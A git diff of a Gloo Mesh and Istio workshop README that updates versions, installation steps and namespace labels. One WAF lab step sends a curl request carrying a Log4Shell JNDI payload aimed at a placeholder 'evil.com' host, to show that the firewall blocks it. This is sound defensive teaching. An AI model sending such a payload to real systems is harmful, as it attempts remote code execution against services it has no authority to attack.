@@ -54,12 +54,13 @@ Set these environment variables which will be used throughout the workshop.
 ```sh
 # Used to enable Gloo Mesh (please ask for a trail license key)
 export GLOO_MESH_LICENSE_KEY=<licence_key>
-export GLOO_MESH_VERSION=v2.1.0-beta29
+export GLOO_MESH_VERSION=v2.1.0-rc1
 
 # Istio version information
 export ISTIO_IMAGE_REPO=us-docker.pkg.dev/gloo-mesh/istio-workshops
-export ISTIO_IMAGE_TAG=1.13.8-solo
-export ISTIO_VERSION=1.13.8
+export ISTIO_IMAGE_TAG=1.15.1-solo
+export ISTIO_VERSION=1.15.1
+export ISTIO_REVISION=1-15
 ```
 
 ## Lab 1 - Configure/Deploy the Kubernetes clusters <a name="Lab-1"></a>
@@ -116,9 +117,20 @@ meshctl install \
   --license $GLOO_MESH_LICENSE_KEY
 ```
 
-The management server exposes a grpc endpoint (`kubectl get svc gloo-mesh-mgmt-server -n gloo-mesh`) which the agents in the workload clusters will connect to.
+The management server exposes a grpc endpoint (`kubectl get svc gloo-mesh-mgmt-server -n gloo-mesh`) which the agents in the workload clusters will connect to. Before proceeding to the next step make sure your service Type LoadBalancer EXTERNAL-IP is ready.
 
-Use `meshctl` to install the Gloo Mesh agent in the service mesh clusters and register them with the Gloo Mesh management plane. When a cluster is registered with the management plane, the agent is configured with the token and certificate to securely connect to the Gloo Mesh management plane via mutual TLS (mTLS).
+```
+kubectl get svc gloo-mesh-mgmt-server -n gloo-mesh --context $MGMT
+```
+You should see something like this in your output:
+```
+NAME                    TYPE           CLUSTER-IP       EXTERNAL-IP      PORT(S)                         AGE
+gloo-mesh-mgmt-server   LoadBalancer   10.251.249.168   173.255.118.55   8090:31890/TCP,9900:31264/TCP   2m43s
+``` 
+
+Once that Gloo Mesh Management Server LB is ready use `meshctl` to install the Gloo Mesh agent in the service mesh clusters and register them with the Gloo Mesh management plane. When a cluster is registered with the management plane, the agent is configured with the token and certificate to securely connect to the Gloo Mesh management plane via mutual TLS (mTLS).
+
+
 
 3. Finally, you need to register the two other clusters by deploying the gloo mesh agents.
 
@@ -176,14 +188,11 @@ export PATH=$PWD/istio-${ISTIO_VERSION}/bin:$PATH
 istioctl version
 ```
 
-2. Install Istio to each of the remote clusters. If you're using local Kubernetes clusters on a Mac M1 or M2, use [these ARM instructions](problems-istio-arm.md) instead.
+2. Install Istio to each of the remote clusters using the Gloo Mesh Istio Lifecycle Manager and Gateway Lifecycle Manager.
 
 ```sh
-kubectl create namespace istio-gateways --context $CLUSTER1
-istioctl install --set hub=$ISTIO_IMAGE_REPO --set tag=$ISTIO_IMAGE_TAG  -y --context $CLUSTER1 -f install/istio/istiooperator-cluster1.yaml
-
-kubectl create namespace istio-gateways --context $CLUSTER2
-istioctl install --set hub=$ISTIO_IMAGE_REPO --set tag=$ISTIO_IMAGE_TAG  -y --context $CLUSTER2 -f install/istio/istiooperator-cluster2.yaml
+kubectl apply -f install/istio/gm-istiod.yaml --context $MGMT
+kubectl apply -f install/istio/gm-ingress-gateway.yaml --context $MGMT
 ```
 
 3. Verify in the Gloo Mesh Dashboard that the deployed Istio information was discovered.
@@ -672,7 +681,7 @@ In order to use the various features of the Gloo Mesh gateway you will need to d
 
 ```sh
 kubectl --context ${CLUSTER1} create namespace gloo-mesh-addons
-kubectl --context ${CLUSTER1} label namespace gloo-mesh-addons istio-injection=enabled
+kubectl --context ${CLUSTER1} label namespace gloo-mesh-addons istio.io/rev=1-15
 
 helm repo add gloo-mesh-agent https://storage.googleapis.com/gloo-mesh-enterprise/gloo-mesh-agent
 helm repo update
@@ -736,7 +745,7 @@ EOF
 4. Try the previous request again.
 
 ```sh
-curl -ik -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
+curl -ik -I -X GET -H "User-Agent: \${jndi:ldap://evil.com/x}" http://$GLOO_GATEWAY
 ```
 
 Note that the request is now blocked with the custom intervention message from the WAF policy.
